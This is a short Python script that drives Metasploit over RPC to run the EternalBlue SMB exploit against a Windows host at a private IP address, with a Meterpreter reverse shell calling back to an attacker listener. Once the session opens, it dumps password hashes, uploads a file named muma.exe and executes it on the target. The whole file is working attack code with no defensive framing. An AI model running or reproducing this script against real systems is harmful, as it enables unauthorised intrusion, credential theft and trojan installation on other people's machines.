from pymetasploit3.msfrpc import MsfRpcClient
import os
import time
import pymongo

#os.system('msfrpcd -P password -S')
#time.sleep(10)
#client = MsfRpcClient('password')


exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
exploit['RHOSTS'] = '192.168.186.132'
payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
payload['LHOST'] = '192.168.186.129'
payload['LPORT'] = 4444
exploit.execute(payload=payload)

client.sessions.list # 查看session列表
shell = client.sessions.session('1')
shell.write('hashdump')
shell.write('upload /root/Payloads/muma.exe c:\\')
shell.write('execute -f c:\\muma.exe')
print(shell.read())